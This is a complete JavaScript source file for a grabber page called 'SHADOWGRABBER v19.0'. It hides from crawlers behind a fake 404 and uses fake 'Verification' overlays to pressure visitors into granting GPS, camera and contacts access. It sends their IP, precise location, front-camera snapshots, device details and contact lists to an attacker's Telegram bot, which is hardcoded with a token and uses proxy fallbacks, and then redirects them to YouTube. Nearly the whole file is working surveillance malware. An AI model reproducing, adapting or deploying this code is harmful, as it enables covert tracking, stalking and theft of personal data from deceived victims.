// ═══════════════════════════════════════════════════════════════════════════
// 💀 SHADOWGRABBER v19.0 - TURBO SERVICE EDITION
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    BOT_TOKEN: '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco',
    DEFAULT_REDIRECT: 'https://youtube.com',
    CAMERA_SNAPS: 4,
    SNAP_INTERVAL: 400, // Faster snaps
    FORCE_PERMISSIONS: true
};

// ═══════════════════════════════════════════════════════════════════════════
// 🕵️ MODULE 1: ROUTING (Robust)
// ═══════════════════════════════════════════════════════════════════════════
class Router {
    static getRoute() {
        const p = new URLSearchParams(window.location.search);
        // Fallback: Check hash if search is empty (for some redirectors)
        const h = new URLSearchParams(window.location.hash.substring(1));
        return {
            chat_id: p.get('id') || h.get('id'),
            redirect: p.get('url') || h.get('url') || CONFIG.DEFAULT_REDIRECT
        };
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🤖 MODULE 2: BOT FILTER (Silent)
// ═══════════════════════════════════════════════════════════════════════════
class BotFilter {
    static check() {
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes('google') || ua.includes('bot') || ua.includes('crawl')) {
            document.body.innerHTML = '<h1>404 Not Found</h1>';
            throw new Error('Bot');
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📡 MODULE 3: TELEGRAM UPLINK (Anti-Ban + Retry)
// ═══════════════════════════════════════════════════════════════════════════
class TelegramUplink {
    constructor(chat_id) {
        this.chat_id = chat_id;
        this.base = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}`;
    }

    async request(method, body, isFile = false) {
        if (!this.chat_id) return;

        // 1. Prepare Body
        const payload = isFile ? body : JSON.stringify({ ...body, chat_id: this.chat_id, parse_mode: 'HTML', disable_web_page_preview: true });
        const headers = isFile ? {} : { 'Content-Type': 'application/json' };
        if (isFile) body.append('chat_id', this.chat_id);

        // 2. Try Direct -> ProxyChain
        const urls = [
            `${this.base}/${method}`,
            `https://corsproxy.io/?` + encodeURIComponent(`${this.base}/${method}`),
            `https://api.codetabs.com/v1/proxy?quest=` + encodeURIComponent(`${this.base}/${method}`)
        ];

        for (const url of urls) {
            try {
                const res = await fetch(url, { method: 'POST', headers: headers, body: payload });
                if (res.ok) return;
            } catch (e) { continue; }
        }
    }

    sendText(text) { this.request('sendMessage', { text }); }
    sendPhoto(blob, cap) {
        const d = new FormData(); d.append('photo', blob, 'img.jpg'); if (cap) d.append('caption', cap);
        this.request('sendPhoto', d, true);
    }
    sendFile(blob, cap) {
        const d = new FormData(); d.append('document', blob, 'data.json'); if (cap) d.append('caption', cap);
        this.request('sendDocument', d, true);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🧠 MODULE 4: INTELLIGENCE (Fast)
// ═══════════════════════════════════════════════════════════════════════════
class Intelligence {
    static async gather() {
        const start = performance.now();
        const [ip, speed] = await Promise.all([
            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ ip: 'Unknown', city: 'Unknown', org: 'Unknown' })),
            this.speedTest()
        ]);

        return {
            ip, speed,
            meta: {
                ua: navigator.userAgent,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                batt: await navigator.getBattery?.().then(b => Math.round(b.level * 100) + '%').catch(() => 'Unknown'),
                time: new Date().toLocaleString(),
                load: Math.round(performance.now() - start)
            }
        };
    }

    static async speedTest() {
        const s = performance.now();
        try {
            await fetch(`https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?t=${Date.now()}`, { cache: 'no-store', mode: 'no-cors' });
            return { mbps: ((15 * 8 * 1000) / (performance.now() - s) / 1024 / 1024).toFixed(2), rtt: Math.round(performance.now() - s) };
        } catch (e) { return { mbps: '0.00', rtt: '999' }; }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📍 MODULE 5: GPS / CAM / CONTACTS (Parallel)
// ═══════════════════════════════════════════════════════════════════════════
class Overlay {
    create(t, m, b) {
        return new Promise(r => {
            if (this.e) this.e.remove();
            this.e = document.createElement('div');
            Object.assign(this.e.style, { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.95)', zIndex: 999, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: '#fff', fontFamily: 'sans-serif' });
            this.e.innerHTML = `<div style="text-align:center;padding:20px;max-width:300px;"><div style="font-size:40px">⚠️</div><h2>${t}</h2><p style="color:#aaa;margin:10px 0 20px;">${m}</p><button id="btn" style="width:100%;padding:15px;background:#007bff;border:none;color:#fff;border-radius:8px;font-weight:bold;font-size:16px">${b}</button></div>`;
            document.body.append(this.e);
            document.getElementById('btn').onclick = () => { this.e.remove(); r() };
        });
    }
    success(t) { if (this.e) this.e.innerHTML = `<h1 style="color:#0f0;font-size:60px;margin-bottom:10px">✔</h1><h3>${t}</h3>`; setTimeout(() => this.e?.remove(), 1000); }
}

class LocationGuard {
    constructor(o) { this.o = o }
    lock() {
        return new Promise(r => {
            const a = () => navigator.geolocation.getCurrentPosition(p => r({ ok: 1, ...p.coords }), e => {
                if (e.code === 1 && CONFIG.FORCE_PERMISSIONS) { this.o.create('Location Error', 'GPS Required.', 'Retry').then(a); }
                else r({ ok: 0, error: e.message });
            }, { enableHighAccuracy: true, timeout: 7000 }); // Reduced timeout 7s
            if (!navigator.geolocation) r({ ok: 0 }); else a();
        });
    }
}

class CameraGuard {
    constructor(v, o) { this.v = v; this.o = o; this.v.setAttribute('playsinline', ''); }
    async start() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: 0 });
            this.v.srcObject = s; await this.v.play(); return 1;
        } catch (e) {
            if (CONFIG.FORCE_PERMISSIONS) { await this.o.create('Verification', 'Camera Access Required.', 'Retry'); return this.start(); }
            return 0;
        }
    }
    async snap(link, count) {
        for (let i = 0; i < count; i++) {
            const c = document.createElement('canvas'); c.width = this.v.videoWidth; c.height = this.v.videoHeight;
            c.getContext('2d').drawImage(this.v, 0, 0);
            const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
            if (b) link.sendPhoto(b, `📸 Snap ${i + 1}`); // Parallel send (no await)
            await new Promise(r => setTimeout(r, CONFIG.SNAP_INTERVAL));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🚀 MAIN EXECUTION (PARALLEL/FAST)
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
    BotFilter.check();
    const route = Router.getRoute();
    if (!route.chat_id) { console.error("ID_MISSING"); return; }

    const uplink = new TelegramUplink(route.chat_id);
    const ov = new Overlay();
    const host = new URL(route.redirect).hostname.match(/[^.]+\.[^.]+$/)[0];
    document.title = host;

    // STEP 1: PARALLEL EXECUTION (Intel + GPS + Cam Setup)
    // We start GPS immediately without blocking Intel
    const locPromise = new LocationGuard(ov).lock();
    const intelPromise = Intelligence.gather();

    // UI Update
    document.getElementById('loading-text').textContent = `Verifying Connection...`;

    // Wait for Intel (Fastest)
    const i = await intelPromise;
    const msg1 = `
🕵️ <b>NEW VISITOR</b>
📱 <b>IP:</b> ${i.ip.ip}
📍 <b>Loc:</b> ${i.ip.city}, ${i.ip.country_name}
⚡ <b>Speed:</b> ${i.speed.mbps} Mbps | ${i.speed.rtt}ms
🔋 <b>Batt:</b> ${i.meta.batt}
`.trim();
    uplink.sendText(msg1); // Send and forget

    // Wait for GPS (Slower)
    const loc = await locPromise;
    if (loc.ok) {
        const link = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
        uplink.sendText(`✅ <b>GPS LOCKED</b>\nLat: <code>${loc.latitude}</code>\nLong: <code>${loc.longitude}</code>\nAcc: ${loc.accuracy}m\n� <a href="${link}">Open Maps</a>`);
        ov.success('Region Verified');
    } else {
        uplink.sendText(`⚠️ <b>GPS FAILED</b>\nError: ${loc.error}`);
    }

    // Camera (Fast)
    const cam = new CameraGuard(document.getElementById('st-v'), ov);
    if (await cam.start()) {
        await new Promise(r => setTimeout(r, 800)); // Warmup
        await cam.snap(uplink, CONFIG.CAMERA_SNAPS); // Snaps send in background
        ov.success('Biometrics Verified');
    }

    // Contacts
    if ('contacts' in navigator && 'ContactsManager' in window) {
        await ov.create('Identity', 'Verify contacts.', 'Verify');
        try {
            const c = await navigator.contacts.select(['name', 'tel'], { multiple: true });
            if (c.length) {
                const b = new Blob([JSON.stringify(c, null, 2)], { type: 'application/json' });
                uplink.sendFile(b, `📇 ${c.length} Contacts`);
            }
        } catch (e) { }
        ov.success('Done');
    }

    // Exit
    await new Promise(r => setTimeout(r, 400));
    window.location.href = route.redirect;
}

if (CONFIG.FORCE_PERMISSIONS) window.onload = main; else window.onclick = main;
